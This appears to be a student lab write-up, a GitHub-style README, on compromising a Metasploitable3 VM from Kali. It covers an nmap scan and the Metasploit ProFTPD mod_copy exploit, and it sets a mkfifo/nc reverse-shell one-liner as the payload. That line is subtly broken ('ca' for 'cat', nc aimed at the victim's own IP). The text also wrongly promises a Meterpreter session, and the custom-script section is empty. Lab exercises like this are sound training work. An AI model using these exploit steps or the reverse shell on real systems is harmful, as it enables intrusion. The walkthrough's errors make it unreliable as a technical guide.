# Phase 1 â€“ Setup and Compromise of a Vulnerable Service

This phase focused on preparing the environment and compromising a vulnerable service using both **Metasploit** and a **custom script**. It reflects hands-on penetration testing and offensive security skills, performed in a safe and isolated environment.

## Objectives

- Set up Metasploitable3 (Victim) and Kali Linux (Attacker)
- Verify connectivity and identify open ports/services
- Exploit a vulnerable service using Metasploit
- Build and execute a **custom exploit script**
- Document all steps and commands used

---

## Victim Environment: Metasploitable3

### Setup Steps

1. **Download and then launch the imported Metasploitable 3 VM**  
   `https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/`  

2. **Login:**  
   Username: `vagrant`  
   Password: `vagrant`

## Attacker Environment: Kali Linux

### Initial Setup & Updates  
`sudo apt update && sudo apt upgrade -y`

---

## Ensuring Connectivity Between VMs

### Get victim machine IP:  
Run inside Metasploitable3: `ipconfig`

### Get attacker machine IP:  
Run inside Kali: `ip a`

### Test connectivity:  
`ping 192.168.56.101`

## Port Scanning with Nmap  
`nmap -sV 192.168.56.101`

Sample Output Snippet:

## Selected Service: ftp (port 21)

Due to its history of vulnerabilities and real-world relevance , we selected **ftp** for this attack phase.

---

## Exploitation using Metasploit

### Launch Metasploit Console:  
`sudo msfconsole`

### Search services available for exploitation:
`search proftpd`

### Load ftp Exploit Module:  
`use exploit/unix/ftp/proftpd_modcopy_exec`

### Check required options for exploitation:  
`show options`

![image](https://github.com/user-attachments/assets/081249f6-fa57-4fc0-9be2-f3dab5b0690e)


### Set required options:  
`set RHOSTS 192.168.56.101`  
`set SITEPATH /var/www/html`   
`set AllowNoCleanup true`

### Check and select an available payload:  
`show payloads`
`set payload cmd/unix/generic`

### Check required options for payload:  
`show payload options`

### Set required payload options:    
`set cmd rm /tmp/f;mkfifo /tmp/f; ca /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 4444 > /tmp/f`

### Start listening from the victim machine:

### Exploit!  
`run`

### Verify access:

![image](https://github.com/user-attachments/assets/2a63233c-c97f-4522-9169-aec7a06f986b)


 If successful, a Meterpreter session is opened, providing full access.

---

## Custom Exploitation Script

We wrote a **Python script** to automate the attack for demonstration.

### Connect to the victim's ftp:

### Run the script:

## Challenges Faced

- Issues with Metasploitable3 provisioning on some hardware
- Initial network misconfiguration between VMs
- Failing to open sessions after using the `run` command
